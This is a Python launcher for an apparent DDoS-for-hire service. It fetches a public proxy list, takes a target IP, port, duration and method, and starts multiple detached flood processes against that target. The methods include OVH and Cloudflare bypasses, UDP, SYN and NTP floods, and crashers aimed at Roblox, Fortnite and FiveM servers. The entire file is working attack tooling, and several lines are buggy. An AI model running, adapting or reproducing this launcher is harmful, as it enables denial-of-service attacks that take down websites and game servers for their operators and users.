
import random
import socket
import threading
import sys
import time
import os
import requests
req = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=yes&anonymity=all')
with open("proxy.txt","wb") as text:
	text.write(req.content)
	print("Download Proxy Succesfully")




def STD():
    global STD
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r STD")
    os.system(f"screen -dmS 1.1.1.1 ./STD {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 ./STD {ip} {port} {time}")
   
def OVHDEATH():
    global OVHDEATH
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-DEATH")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-DEATH {ip} {port} 35 -1 {time}")
   
def OVHSAS():
    global OVHSAS
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-SAS")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-SAS {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-SAS {ip} {port} {time}")
   
def ROBLOXCRASH():
    global ROBLOXCRASH
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r ROBLOX-CRASH")
    os.system(f"screen -dmS 1.1.1.1 ./ROBLOX {ip} 100 50 {time}")
   
def OVHBEAM():
    global OVHBEAM
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-BEAM")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BEAM HEAD {ip} {port} {time} 1024")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BEAM GET {ip} {port} {time} 1024")

def OVHAMP():
    global OVHAMP
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-AMP")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-AMP {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-AMP {ip} {time}")
   
def VSE():
    global VSE
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r vse")
    os.system(f"screen -dmS 1.1.1.1 ./vse {ip} {port} 6 {time}")
    os.system(f"screen -dmS 1.1.1.1 ./vse {ip} {port} 6 {time}")
   
def AMPYNM():
    global AMPYNM
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r AMP-YNM")
    os.system(f"screen -dmS 1.1.1.1 ./AMP-YNM GET {ip} {port} {time} 1024")
    os.system(f"screen -dmS 1.1.1.1 ./AMP-YNM GET {ip} {port} {time} 1024")
    print("test")  
    
def TCPBYPASS():
    global TCPBYPASS
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r TCP")
    os.system(f"screen -dmS 1.1.1.1 ./TCP {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 ./TCP {ip} {port} {time}")
    
def TCPGET():
    global TCPGET
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r LUSH")
    os.system(f"screen -dmS 1.1.1.1 ./LUSH GET {ip} {port} {time} 1024")
    os.system(f"screen -dmS 1.1.1.1 ./LUSH GET {ip} {port} {time} 1024")
    
def FIVEM():
    global FIVEM
    os.system(f"chmod u=rwx,g=r,o=r OVH-BYPASS")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS POST {ip} {port} {time} 1024")  
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS PHEAD {ip} {port} {time} 1024")  
    
def TCPKILL():
    global TCPKILL
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-BYPASS")   
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS HEAD {ip} {port} {time} 1024")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS GET {ip} {port} {time} 1024")
    
def CFNULL():
    global CFNULL
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node kraken-bypass.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node kraken-bypass.js {ip} {time}")
    
def HTTPREQUESTS():
    global HTTPREQUESTS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTP-REQUESTS.js {ip} 64 {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-REQUESTS.js {ip} 64 {time}")
    
def CFSOCKET():
    global CFSOCKET
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node CF-SOCKET.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node CF-SOCKET.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node CF-SOCKET.js {ip} {time}")
    
    
def TCPYNM():
    global TCPYNM
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r TCP-YNM")
    os.system(f"screen -dmS 1.1.1.1 ./TCP-YNM TCP {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 ./TCP-YNM TCP {ip} {port} {time}")
    
def UDPBYPASS():
    global UDPBYPASS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 python3 UDP-BYPASS.py {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 python3 UDP-BYPASS.py {ip} {port} {time}")

def SYN():
    global SYN
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 python3 SYN.py {ip} {port} {time} 50000 10")

def FORTNITE():
    global FORTNITE
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 python3 FORTNITE.py {ip} {port} {time} 500 1000000")
    
def SAMP():
    global SAMP
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 python3 UDP-PACKET.py {ip} {port} {time}")
    os.system(f"screen -dmS 1.1.1.1 python3 UDP-PACKET.py {ip} {port} {time}")
    
def UDPNUKE():
    global UDPNUKE
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 perl private.pl {ip} {time}")  
    os.system(f"screen -dmS 1.1.1.1 perl private.pl {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 perl private.pl {ip} {time}")
    
def UDPFLOOD():
    global UDPFLOOD
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 perl UDP-FLOOD.pl {ip} {port} 120 {time}")
    os.system(f"screen -dmS 1.1.1.1 perl UDP-FLOOD.pl {ip} {port} 120 {time}")
    
def HOME():
    global HOME
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 perl home.pl {ip} {port} 120 {time}")
    os.system(f"screen -dmS 1.1.1.1 perl home.pl {ip} {port} 120 {time}")

def OVHBYPASS():
    global OVHBYPASS
    global ip
    global port
    global time
    os.system(f"chmod u=rwx,g=r,o=r OVH-BYPASS")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS HEAD {ip} {port} {time} 1024")
    os.system(f"screen -dmS 1.1.1.1 ./OVH-BYPASS HEAD {ip} {port} {time} 1024")
    print("Test")
   
def NTP():
    global NTP
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 perl NTP.pl {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 perl NTP.pl {ip} {time}")
    
def HTTPSBYPASS():
    global HTTPSBYPASS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node https-bypass.js {ip} {time} proxy 5")
    
def HTTPSBYPASSV2():
    global HTTPSBYPASSV2
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node https-bypassv2.js {ip} {time} POST")
    os.system(f"screen -dmS 1.1.1.1 node https-bypassv2.js {ip} {time} POST")
    os.system(f"screen -dmS 1.1.1.1 node https-bypassv2.js {ip} {time} POST")
    os.system(f"screen -dmS 1.1.1.1 node https-bypassv2.js {ip} {time} POST")

def HTTPSRAW():
    global HTTPSRAW
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-RAW.js {ip} {time} {port}")
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-RAW.js {ip} {time} {port}")
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-RAW.js {ip} {time} {port}")
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-RAW.js {ip} {time} {port}")
   
def HTTPBYPASS():
    global HTTPBYPASS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTP-BYPASS.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-BYPASS.js {ip} {time}")
   
def HTTPRAW():
    global HTTPRAW
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAW.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAW.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAW.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAW.js {ip} {time}")

def HTTPRAND():
    global HTTPRAND
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAND.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAND.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-RAND.js {ip} {time}")

def CFBYPASS():
    global CFBYPASS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node CfBypass.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node CfBypass.js {ip} {time}")
   
def HTTPSSTORM():
    global HTTPSSTORM
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node Bypass.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node Bypass.js {ip} {time}")
    
def HTTPSTLS():
    global HTTPSTLS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-TLS.js {ip} {time}")
    os.system(f"screen -dmS 1.1.1.1 node HTTPS-TLS.js {ip} {time}")
    
def HTTPPPS():
    global HTTPPPS
    global ip
    global port
    global time
    os.system(f"screen -dmS 1.1.1.1 node HTTP-PPS.js {ip} 25 {timue}")
    os.system(f"screen -dmS 1.1.1.1 node HTTP-PPS.js {ip} 25 {time}")
 
ip = sys.argv[1]
port = int(sys.argv[2])
time = int(sys.argv[3])
method = sys.argv[4]
if method == "OVH-BYPASS":
    OVHBYPASS()
if method == "OVH-BEAM":
    OVHBEAM()
if method == "OVH-SAS":
    OVHSAS()
if method == "VSE":
    VSE()
if method == "HTTP-PPS":
    HTTPPPS()
if method == "CF-SOCKET":
    CFSOCKET()
if method == "SAMP":
    SAMP()
if method == "OVH-DEATH":
    OVHDEATH()
if method == "HTTPS-TLS":
    HTTPS-TLS()
if method == "FORTNITE":
    FORTNITE()
if method == "OVH-AMP":
    OVHAMP()
if method == "NTP":
    NTP()
if method == "STD":
    STD()
if method == "TCP-OVH":
    TCPYNM()
if method == "TCP-KILL":
    TCPKILL()
if method == "FIVEM":
    FIVEM()
if method == "AMP-OVH":
    AMPYNM()
if method == "UDP-NUKE":
    UDPNUKE()
if method == "UDP-FLOOD":
    UDPFLOOD()
if method == "HOME":
    HOME()
if method == "ROBLOX-CRASH":
    ROBLOXCRASH()
if method == "SYN":
    SYN()
if method == "TCP-GET":
    TCPGET()
if method == "TCP-BYPASS":
    TCPBYPASS()
if method == "HTTPS-BYPASS":
    HTTPSBYPASS()
if method == "HTTPS-STORM":
    HTTPSSTORM()
if method == "HTTP-RAW":
    HTTPRAW()
if method == "HTTP-BYPASS":
    HTTPBYPASS()
if method == "HTTPS-RAW":
    HTTPSRAW()
if method == "HTTP-RAND":
    HTTPRAND()
if method == "UDP-BYPASS":
    UDPBYPASS()
if method == "CF-BYPASS":
    CFBYPASS()
if method == "CF-NULL":
    CFNULL()
if method == "HTTP-REQUESTS":
    HTTPREQUESTS()
if method == "HTTPS-BYPASSV2":
    HTTPSBYPASSV2()
